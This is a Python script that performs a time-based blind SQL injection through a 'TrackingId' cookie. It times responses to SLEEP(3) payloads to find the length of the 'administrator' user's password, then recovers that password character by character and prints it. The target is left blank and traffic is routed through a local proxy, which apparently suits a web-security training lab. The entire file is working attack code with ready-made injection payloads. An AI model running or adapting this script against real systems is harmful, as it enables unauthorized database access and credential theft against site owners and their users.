import requests
import sys
from urllib.parse import quote_plus
import urllib3
import time

urllib3.disable_warnings()

TARGET = ""
SQLI_LENGTH_STRING = "X' OR IF((SELECT LENGTH(password) FROM users WHERE username='administrator') = {length}, SLEEP(3), 0)--"
SQLI_CHAR_STRING = "X' OR IF((SELECT ASCII(SUBSTRING(password, {position}, 1)) FROM users WHERE username='administrator') = {char}, SLEEP(3), 0)--"
PROXIES = {
    'http': 'http://127.0.0.1:8080'
}
COOKIES = {
    "TrackingId": "{payload}"
}

# Define character ranges for lowercase letters and digits
CHAR_RANGES = list(range(48, 58)) + list(range(97, 123))

class SQLI:
    def __init__(self, target):
        self.target = target

    def craft_query(self, template, **kwargs):
        return template.format(**kwargs)

    def get_request(self, query):
        cookies = {
            "TrackingId": COOKIES["TrackingId"].format(payload=quote_plus(query))
        }
        start_time = time.time()
        resp = requests.get(self.target, allow_redirects=False, proxies=PROXIES, cookies=cookies, verify=False)
        elapsed_time = time.time() - start_time
        return elapsed_time >= 3  # Check if delay is ≥ 3 seconds

    def find_password_length(self):
        for length in range(1, 51):  # Test lengths from 1 to 50
            query = self.craft_query(SQLI_LENGTH_STRING, length=length)
            print(f"Testing length: {length}")
            if self.get_request(query):
                print(f"Password length found: {length}")
                return length
        return None

    def extract_password(self, length):
        output = ""
        for position in range(1, length + 1):
            for test_val in CHAR_RANGES:
                sys.stdout.write(chr(test_val))
                sys.stdout.write('\b')
                sys.stdout.flush()

                query = self.craft_query(SQLI_CHAR_STRING, position=position, char=test_val)
                if self.get_request(query):
                    output += chr(test_val)
                    break
        return output


if __name__ == "__main__":
    print("STARTING")
    sqli = SQLI(TARGET)

    # Step 1: Find password length
    password_length = sqli.find_password_length()
    if not password_length:
        print("Unable to determine password length")
        sys.exit(1)

    # Step 2: Extract password using determined length
    password = sqli.extract_password(password_length)
    print(f"Password: {password}")
    print("finished")
